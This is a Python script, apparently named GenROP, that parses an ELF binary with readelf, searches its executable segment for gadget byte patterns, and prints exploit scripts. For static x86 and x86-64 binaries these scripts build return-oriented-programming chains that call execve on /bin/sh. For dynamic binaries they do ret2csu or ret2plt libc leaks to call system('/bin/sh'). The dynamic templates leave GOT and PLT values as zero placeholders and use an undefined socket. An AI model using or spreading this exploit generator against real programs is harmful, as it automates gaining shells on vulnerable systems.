import sys
import subprocess

class GenROP(object):
    def __init__(self, fpath):
        self.fpath = fpath

    def analyze(self):
        self.arch = None
        self.is_static = True

        p = subprocess.run(['readelf', '-e', '-W', self.fpath], stdout=subprocess.PIPE, stderr=subprocess.PIPE, encoding='ascii', check=True)
        for line in p.stdout.splitlines():
            if line.startswith('  Machine:'):
                if 'Advanced Micro Devices X86-64' in line:
                    self.arch = 'x86-64'
                elif 'Intel 80386' in line:
                    self.arch = 'x86'
                else:
                    raise Exception('architecture is not supported')
            if line.startswith('  DYNAMIC'):
                self.is_static = False
            elif line.startswith('  LOAD'):
                if 'R E' in line:
                    ary = line.split()
                    self.offset = int(ary[1], 16)
                    self.virtaddr = int(ary[2], 16)
                    self.filesiz = int(ary[4], 16)
                elif 'RW ' in line:
                    ary = line.split()
                    self.virtaddr_writable = int(ary[2], 16)

    def generate(self):
        if self.arch == 'x86-64':
            if self.is_static:
                return self.generate_static_x86_64()
            else:
                return self.generate_dynamic_x86_64()
        elif self.arch == 'x86':
            if self.is_static:
                return self.generate_static_x86()
            else:
                return self.generate_dynamic_x86()

    def generate_static_x86_64(self):
        with open(self.fpath, 'rb') as f:
            f.seek(self.offset, 0)
            xdata = f.read(self.filesiz)

        offset_mov_rdi_rsi = xdata.index(b'\x48\x89\x37\xc3')
        offset_pop_rdi = xdata.index(b'\x5f\xc3')
        offset_pop_rsi = xdata.index(b'\x5e\xc3')
        offset_pop_rdx = xdata.index(b'\x5a\xc3')
        offset_pop_rax = xdata.index(b'\x58\xc3')
        offset_syscall = xdata.index(b'\x0f\x05')

        return """import sys
import struct

addr_bin = 0x{:x}
addr_writable = 0x{:x}
addr_mov_rdi_rsi = addr_bin + 0x{:x}
addr_pop_rdi = addr_bin + 0x{:x}
addr_pop_rsi = addr_bin + 0x{:x}
addr_pop_rdx = addr_bin + 0x{:x}
addr_pop_rax = addr_bin + 0x{:x}
addr_syscall = addr_bin + 0x{:x}

buf = b''
buf += struct.pack('<Q', addr_pop_rsi)
buf += struct.pack('<Q', 0x68732f6e69622f)  # '/bin/sh\\00'
buf += struct.pack('<Q', addr_pop_rdi)
buf += struct.pack('<Q', addr_writable)
buf += struct.pack('<Q', addr_mov_rdi_rsi)
buf += struct.pack('<Q', addr_pop_rsi)
buf += struct.pack('<Q', 0)
buf += struct.pack('<Q', addr_pop_rdx)
buf += struct.pack('<Q', 0)
buf += struct.pack('<Q', addr_pop_rax)
buf += struct.pack('<Q', 59)
buf += struct.pack('<Q', addr_syscall)

sys.stdout.buffer.write(buf)
""".format(self.virtaddr, self.virtaddr_writable, offset_mov_rdi_rsi, offset_pop_rdi, offset_pop_rsi, offset_pop_rdx, offset_pop_rax, offset_syscall)

    def generate_dynamic_x86_64(self):
        with open(self.fpath, 'rb') as f:
            f.seek(self.offset, 0)
            xdata = f.read(self.filesiz)

        offset_csu_init2 = xdata.index(b'\x4c\x89\xfa\x4c\x89\xf6\x44\x89\xef\x41\xff\x14\xdc')
        offset_csu_init1 = offset_csu_init2 + 0x1a

        return """import sys
import struct

addr_bin = 0x{:x}
addr_csu_init1 = addr_bin + 0x{:x}
addr_csu_init2 = addr_bin + 0x{:x}
got_write = 0
got_read = 0
offset_write = 0
offset_system = 0

buf = b''
buf += struct.pack('<QQQQQQ', addr_csu_init1, 0, 1, got_write, 8, got_write, 1)
buf += struct.pack('<QQQQQQQ', addr_csu_init2, 0, 0, 1, got_read, 16, got_write, 0)
buf += struct.pack('<QQQQQQQ', addr_csu_init2, 0, 0, 1, got_write, 0, 0, got_write+8)
buf += struct.pack('<Q', addr_csu_init2)

sys.stdout.buffer.write(buf)

data = s.recv(8).ljust(8, b'\\x00')
libc_write = struct.unpack('<Q', data)[0]
libc_system = libc_write - offset_write + offset_system
s.sendall(struct.pack('<Q', libc_system) + b'/bin/sh\\x00')
""".format(self.virtaddr, offset_csu_init1, offset_csu_init2)

    def generate_static_x86(self):
        with open(self.fpath, 'rb') as f:
            f.seek(self.offset, 0)
            xdata = f.read(self.filesiz)

        offset_mov_edx_eax = xdata.index(b'\x89\x02\xc3')
        offset_pop_edx = xdata.index(b'\x5a\xc3')
        offset_pop_ecx_ebx = xdata.index(b'\x59\x5b\xc3')
        offset_pop_eax = xdata.index(b'\x58\xc3')
        offset_int80 = xdata.index(b'\xcd\x80')

        return """import sys
import struct

addr_bin = 0x{:x}
addr_writable = 0x{:x}
addr_mov_edx_eax = addr_bin + 0x{:x}
addr_pop_edx = addr_bin + 0x{:x}
addr_pop_ecx_ebx = addr_bin + 0x{:x}
addr_pop_eax = addr_bin + 0x{:x}
addr_int80 = addr_bin + 0x{:x}

buf = b''
buf += struct.pack('<I', addr_pop_edx)
buf += struct.pack('<I', addr_writable)
buf += struct.pack('<I', addr_pop_eax)
buf += struct.pack('<I', 0x6e69622f)  # '/bin'
buf += struct.pack('<I', addr_mov_edx_eax)
buf += struct.pack('<I', addr_pop_edx)
buf += struct.pack('<I', addr_writable+4)
buf += struct.pack('<I', addr_pop_eax)
buf += struct.pack('<I', 0x68732f)  # '/sh\\x00'
buf += struct.pack('<I', addr_mov_edx_eax)
buf += struct.pack('<I', addr_pop_edx)
buf += struct.pack('<I', 0)
buf += struct.pack('<I', addr_pop_ecx_ebx)
buf += struct.pack('<I', 0)
buf += struct.pack('<I', addr_writable)
buf += struct.pack('<I', addr_pop_eax)
buf += struct.pack('<I', 11)
buf += struct.pack('<I', addr_int80)

sys.stdout.buffer.write(buf)
""".format(self.virtaddr, self.virtaddr_writable, offset_mov_edx_eax, offset_pop_edx, offset_pop_ecx_ebx, offset_pop_eax, offset_int80)

    def generate_dynamic_x86(self):
        with open(self.fpath, 'rb') as f:
            f.seek(self.offset, 0)
            xdata = f.read(self.filesiz)

        offset_pop3 = xdata.index(b'\x83\xc4\x08\x5b\xc3')

        return """import sys
import struct

addr_bin = 0x{:x}
addr_pop3 = addr_bin + 0x{:x}
plt_write = 0
plt_read = 0
got_write = 0
offset_write = 0
offset_system = 0

buf = b''
buf += struct.pack('<I', plt_write)
buf += struct.pack('<I', addr_pop3)
buf += struct.pack('<I', 1)
buf += struct.pack('<I', got_write)
buf += struct.pack('<I', 4)
buf += struct.pack('<I', plt_read)
buf += struct.pack('<I', addr_pop3)
buf += struct.pack('<I', 0)
buf += struct.pack('<I', got_write)
buf += struct.pack('<I', 12)
buf += struct.pack('<I', plt_write)
buf += struct.pack('<I', got_write+4)

sys.stdout.buffer.write(buf)

data = s.recv(4).ljust(4, b'\\x00')
libc_write = struct.unpack('<I', data)[0]
libc_system = libc_write - offset_write + offset_system
s.sendall(struct.pack('<I', libc_system) + b'/bin/sh\\x00')
""".format(self.virtaddr, offset_pop3)


if __name__ == '__main__':
    if len(sys.argv) < 2:
        print('Usage: python3 {} FILE'.format(sys.argv[0]), file=sys.stderr)
        sys.exit(1)

    fpath = sys.argv[1]

    genrop = GenROP(fpath)
    genrop.analyze()
    print(genrop.generate())
